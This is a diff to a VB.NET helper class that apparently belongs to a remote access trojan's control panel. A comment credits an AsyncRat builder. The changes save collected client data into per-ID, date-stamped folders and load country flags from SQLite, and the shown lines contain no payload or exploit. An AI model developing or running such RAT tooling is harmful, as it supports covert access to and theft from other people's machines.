@@ -1,4 +1,5 @@
-﻿Imports System.IO
+﻿Imports System.Data.SQLite
+Imports System.IO
 Imports System.Runtime.Serialization.Formatters.Binary
 Imports System.Text
 Imports System.Threading
@@ -36,15 +37,17 @@ Public Class Helpers
             For Each i As ListViewItem In L.Items
                 H.AppendLine(L.Columns(0).Text & ": " & i.Text & vbNewLine & L.Columns(1).Text & ": " & i.SubItems(1).Text & vbNewLine)
             Next
+            Dim today = Date.Today
+            Dim day = today.Day
+            Dim month = today.Month
 
+            Dim Path As String = Application.StartupPath & "\Users\" & ID.Replace(":", "_") & day & month & "\" & SEP
             Static J As New Random
-            If IO.Directory.Exists(Application.StartupPath & "\" & SEP) Then
-                IO.Directory.CreateDirectory(Application.StartupPath & "\" & SEP)
-                IO.File.WriteAllText(Application.StartupPath & "\" & SEP & "\" & SEP & "_" & ID.Replace(":", "_") & "_" & J.Next(0, 9999) & ".txt", SEP & " From : " & ID & vbNewLine & vbNewLine & H.ToString & vbNewLine)
-
+            If IO.Directory.Exists(Path) Then
+                IO.File.WriteAllText(Path & "\" & SEP & "_" & ID.Replace(":", "_") & "_" & J.Next(0, 9999) & ".txt", SEP & " From : " & ID & vbNewLine & vbNewLine & H.ToString & vbNewLine)
             Else
-                IO.Directory.CreateDirectory(Application.StartupPath & "\" & SEP)
-                IO.File.WriteAllText(Application.StartupPath & "\" & SEP & "\" & SEP & "_" & ID.Replace(":", "_") & "_" & J.Next(0, 9999) & ".txt", SEP & " From : " & ID & vbNewLine & vbNewLine & H.ToString & vbNewLine)
+                IO.Directory.CreateDirectory(Path)
+                IO.File.WriteAllText(Path & "\" & SEP & "_" & ID.Replace(":", "_") & "_" & J.Next(0, 9999) & ".txt", SEP & " From : " & ID & vbNewLine & vbNewLine & H.ToString & vbNewLine)
             End If
         Catch ex As Exception
             MessageBox.Show(ex.ToString())
@@ -59,15 +62,18 @@ Public Class Helpers
             For Each i As ListViewItem In L.Items
                 H.AppendLine(L.Columns(0).Text & ": " & i.Text & vbNewLine & L.Columns(1).Text & ": " & i.SubItems(1).Text & vbNewLine & L.Columns(2).Text & ": " & i.SubItems(2).Text & vbNewLine & L.Columns(3).Text & ": " & i.SubItems(3).Text & vbNewLine)
             Next
+            Dim today = Date.Today
+            Dim day = today.Day
+            Dim month = today.Month
 
+            Dim Path As String = Application.StartupPath & "\Users\" & ID.Replace(":", "_") & day & month & "\" & SEP
             Static J As New Random
-            If IO.Directory.Exists(Application.StartupPath & "\" & SEP) Then
-                IO.Directory.CreateDirectory(Application.StartupPath & "\" & SEP)
-                IO.File.WriteAllText(Application.StartupPath & "\" & SEP & "\" & SEP & "_" & ID.Replace(":", "_") & J.Next(0, 9999) & ".txt", SEP & " From : " & ID & vbNewLine & vbNewLine & H.ToString & vbNewLine)
+            If IO.Directory.Exists(Path) Then
+                IO.File.WriteAllText(Path & "\" & SEP & "_" & ID.Replace(":", "_") & J.Next(0, 9999) & ".txt", SEP & " From : " & ID & vbNewLine & vbNewLine & H.ToString & vbNewLine)
 
             Else
-                IO.Directory.CreateDirectory(Application.StartupPath & "\" & SEP)
-                IO.File.WriteAllText(Application.StartupPath & "\" & SEP & "\" & SEP & "_" & ID.Replace(":", "_") & J.Next(0, 9999) & ".txt", SEP & " From : " & ID & vbNewLine & vbNewLine & H.ToString & vbNewLine)
+                IO.Directory.CreateDirectory(Path)
+                IO.File.WriteAllText(Path & "\" & SEP & "_" & ID.Replace(":", "_") & J.Next(0, 9999) & ".txt", SEP & " From : " & ID & vbNewLine & vbNewLine & H.ToString & vbNewLine)
             End If
 
         Catch ex As Exception
@@ -112,6 +118,48 @@ Public Class Helpers
             Return Format$(value, "0.00")
         End If
     End Function
+
+    Public Shared Function BytesToImage(ByVal Bytesss As Byte()) As Image
+        Using mStream As New MemoryStream(Bytesss)
+            Return Image.FromStream(mStream)
+        End Using
+    End Function
+    Public Shared Function SplitPath(ByVal P As String) As String
+        Dim spl As String() = Split(P, "\")
+        Return spl(spl.Length - 1)
+    End Function
+
+    Public Shared Sub Flags()
+        Dim sqlite_conn As SQLiteConnection
+
+        Dim sqlite_cmd As SQLiteCommand
+
+        Dim sqlite_datareader As SQLiteDataReader
+
+        ' create a new database connection:
+
+        sqlite_conn = New SQLiteConnection("Data Source=Flags.db;Version=3;")
+        ' open the connection:
+
+        sqlite_conn.Open()
+
+
+        sqlite_cmd = sqlite_conn.CreateCommand()
+
+        sqlite_cmd.CommandText = "SELECT Flag FROM Flags"
+
+        sqlite_datareader = sqlite_cmd.ExecuteReader()
+
+        While sqlite_datareader.Read() ' Read() returns true if there is still a result line to read
+
+
+            Dim Myreader As String = sqlite_datareader.GetString(0)
+
+            Countries.ListOfFlags.Add(Myreader)
+
+        End While
+
+    End Sub
     Public Class Builder
         ''Based on AsyncRat Builder From NyanCat
         Public Sub Build(ByVal Params As Object())
@@ -212,6 +260,7 @@ Public Class Helpers
 
             End Try
         End Sub
+
     End Class
 
 End Class
